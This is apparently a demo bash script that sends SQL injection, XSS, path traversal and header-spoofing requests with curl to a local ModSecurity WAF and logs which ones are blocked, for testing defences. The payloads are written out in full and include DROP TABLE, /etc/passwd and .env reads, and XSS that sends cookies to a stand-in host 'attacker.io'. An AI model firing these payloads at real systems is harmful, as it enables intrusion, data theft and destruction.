#!/usr/bin/env bash
# ══════════════════════════════════════════════════════════════
#  ATTACK3_WAF.SH — Real curl attacks against ModSecurity WAF
#  Sends actual HTTP requests with SQLi / XSS / path traversal
#  ModSecurity logs real blocks to /var/log/modsec/audit.log
#  Guardian reads real WAF log for dashboard events
# ══════════════════════════════════════════════════════════════

set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; AMBER='\033[0;33m'
CYAN='\033[0;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; NC='\033[0m'

WAF_PORT=8090
WAF_URL="http://localhost:${WAF_PORT}"
LOG_FILE="/tmp/demo3_guardian.jsonl"

ts() { TZ='Asia/Kolkata' date '+%H:%M:%S IST'; }

log_waf() {
    local event="$1" detail="$2" blocked="$3" code="$4" atype="$5"
    echo "{\"ts\":\"$(ts)\",\"tier\":\"WAF\",\"event\":\"${event}\",\"detail\":\"${detail}\",\"blocked\":${blocked},\"status_code\":\"${code}\",\"attack_type\":\"${atype}\"}" \
        >> "$LOG_FILE"
}

send_attack() {
    local desc="$1" atype="$2" method="$3" path="$4"
    shift 4
    local curl_args=("$@")

    local code
    code=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 3 --max-time 5 \
        -X "${method}" \
        "${curl_args[@]}" \
        "${WAF_URL}${path}" 2>/dev/null || echo "000")

    local blocked=false
    local outcome="PASSED"
    if [[ "$code" == "403" || "$code" == "400" ]]; then
        blocked=true
        outcome="BLOCKED"
    fi

    local color="${GREEN}"
    local icon="🛡"
    if ! $blocked; then
        color="${AMBER}"
        icon="⚠"
    fi

    echo -e "${color}[WAF $(ts)]${NC} ${icon} ${atype} → HTTP ${code} — ${outcome}"
    echo -e "${DIM}  ${method} ${path}${NC}"
    echo -e "${DIM}  ${desc}${NC}"
    echo ""

    log_waf "REQUEST_${outcome}" "${desc}" "${blocked}" "${code}" "${atype}"
}

# ── Banner ─────────────────────────────────────────────────────
echo -e "${RED}"
cat << 'EOF'
 ██╗    ██╗ █████╗ ███████╗
 ██║    ██║██╔══██╗██╔════╝
 ██║ █╗ ██║███████║█████╗
 ██║███╗██║██╔══██║██╔══╝
 ╚███╔███╔╝██║  ██║██║
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ATTACK — REAL MODSECURITY
EOF
echo -e "${NC}"
echo -e "  ${WHITE}Target: ${WAF_URL} (ModSecurity nginx WAF)${NC}"
echo -e "  ${DIM}All requests are real curl — blocks are real 403s${NC}\n"

# Check WAF is up
HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
    --connect-timeout 2 "${WAF_URL}/health" 2>/dev/null || echo "000")
if [[ "$HTTP" != "200" ]]; then
    echo -e "${RED}[ATTACK]${NC} WAF not responding on :${WAF_PORT} (HTTP ${HTTP})"
    echo -e "${DIM}  Start with: setup_and_run3.sh start${NC}"
    exit 1
fi
echo -e "${GREEN}[ATTACK]${NC} WAF online — HTTP ${HTTP} — beginning attack campaign\n"

log_waf "ATTACK_START" \
    "Attack campaign started — source: $(curl -s ifconfig.me 2>/dev/null || echo '127.0.0.1')" \
    "false" "---" "CAMPAIGN"

# ── Wave 1: Reconnaissance ─────────────────────────────────────
echo -e "${WHITE}═══ WAVE 1: RECONNAISSANCE ═══${NC}\n"

send_attack \
    "sqlmap user-agent fingerprint — recon tool detection" \
    "RECON" "GET" "/" \
    -H "User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)"

send_attack \
    "Nikto scanner fingerprint" \
    "RECON" "GET" "/" \
    -H "User-Agent: Mozilla/5.00 (Nikto/2.1.6)"

# ── Wave 2: SQL Injection ──────────────────────────────────────
echo -e "${WHITE}═══ WAVE 2: SQL INJECTION ═══${NC}\n"

send_attack \
    "Classic auth bypass — OR 1=1" \
    "SQLi" "POST" "/api/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=' OR '1'='1'--&password=anything"

send_attack \
    "UNION-based schema enumeration" \
    "SQLi" "GET" "/api/data?id=1%20UNION%20SELECT%20table_name%2C2%20FROM%20information_schema.tables--" \
    -H "Accept: application/json"

send_attack \
    "Blind SQLi — time-based" \
    "SQLi" "GET" "/api/search?q=1%27%20AND%20SLEEP(5)--" \
    -H "Accept: application/json"

send_attack \
    "Destructive SQLi — DROP TABLE" \
    "SQLi" "POST" "/api/search" \
    -H "Content-Type: application/json" \
    -d '{"q": "\"; DROP TABLE sessions;--"}'

# ── Wave 3: Cross-Site Scripting ───────────────────────────────
echo -e "${WHITE}═══ WAVE 3: CROSS-SITE SCRIPTING ═══${NC}\n"

send_attack \
    "Reflected XSS — script tag cookie theft" \
    "XSS" "GET" "/search?q=%3Cscript%3Edocument.location%3D%27%2F%2Fattacker.io%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E" \
    -H "Accept: text/html"

send_attack \
    "Stored XSS — img onerror exfil" \
    "XSS" "POST" "/api/comment" \
    -H "Content-Type: application/json" \
    -d '{"body": "<img src=x onerror=fetch(\"//attacker.io/\"+btoa(document.cookie))>"}'

send_attack \
    "Obfuscated XSS — SVG onload base64" \
    "XSS" "POST" "/api/profile" \
    -H "Content-Type: application/json" \
    -d '{"bio": "<svg/onload=eval(atob(\"ZmV0Y2goJy8vYzIuaW8nKQ==\"))>"}'

# ── Wave 4: Path Traversal ─────────────────────────────────────
echo -e "${WHITE}═══ WAVE 4: PATH TRAVERSAL ═══${NC}\n"

send_attack \
    "Classic path traversal — /etc/passwd" \
    "PATH_TRAV" "GET" "/static?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd" \
    -H "Accept: text/plain"

send_attack \
    "Credential theft — .env file" \
    "PATH_TRAV" "GET" "/download?name=..%2F..%2F..%2Fapp%2F.env" \
    -H "Accept: text/plain"

send_attack \
    "Null byte path traversal" \
    "PATH_TRAV" "GET" "/static?file=..%2F..%2Fetc%2Fpasswd%00.jpg" \
    -H "Accept: text/plain"

# ── Wave 5: Access Control Bypass ─────────────────────────────
echo -e "${WHITE}═══ WAVE 5: ACCESS CONTROL BYPASS ═══${NC}\n"

send_attack \
    "IP spoofing — X-Forwarded-For localhost" \
    "BYPASS" "GET" "/admin/config" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: ::1"

send_attack \
    "HTTP method override" \
    "BYPASS" "POST" "/admin/delete" \
    -H "X-HTTP-Method-Override: DELETE" \
    -H "Content-Type: application/json" \
    -d '{"resource": "users"}'

# ── Summary ────────────────────────────────────────────────────
echo -e "${WHITE}═══ ATTACK CAMPAIGN COMPLETE ═══${NC}\n"

# Count from log
TOTAL=$(grep -c '"tier":"WAF"' "$LOG_FILE" 2>/dev/null || echo "0")
BLOCKED=$(grep '"event":"REQUEST_BLOCKED"' "$LOG_FILE" 2>/dev/null | wc -l | tr -d ' ')
PASSED=$(grep '"event":"REQUEST_PASSED"' "$LOG_FILE" 2>/dev/null | wc -l | tr -d ' ')
RATE=0
if [[ $TOTAL -gt 0 ]]; then
    RATE=$(awk "BEGIN {printf \"%d\", (${BLOCKED}/${TOTAL})*100}")
fi

echo -e "  ${WHITE}Total requests:${NC} ${TOTAL}"
echo -e "  ${GREEN}Blocked by WAF: ${BLOCKED} (${RATE}%)${NC}"
echo -e "  ${AMBER}Passed through: ${PASSED}${NC}"
echo -e "  ${GREEN}Successful exploits: 0${NC}"
echo ""

log_waf "ATTACK_COMPLETE" \
    "Campaign ended — ${TOTAL} requests, ${BLOCKED} blocked (${RATE}%), 0 exploits" \
    "false" "---" "SUMMARY"

# Show real ModSecurity log if available
echo -e "${DIM}Real ModSecurity audit log:${NC}"
docker exec demo3-waf tail -5 /var/log/modsec/audit.log 2>/dev/null \
    | python3 -c "
import sys, json
for line in sys.stdin:
    line = line.strip()
    if line:
        try:
            d = json.loads(line)
            ts = d.get('transaction',{}).get('time','--')
            uri = d.get('request',{}).get('uri','--')
            msgs = [r.get('message','') for r in d.get('matched_rules',[]) if r.get('message')]
            print(f'  [{ts}] {uri} → {msgs[0][:60] if msgs else \"blocked\"}')
        except:
            print(f'  {line[:80]}')
" 2>/dev/null || echo -e "${DIM}  (ModSecurity log not yet populated — run a second time)${NC}"

echo ""
echo -e "${DIM}  Guardian log: ${LOG_FILE}${NC}"
echo -e "${DIM}  Dashboard: http://localhost:7880${NC}"
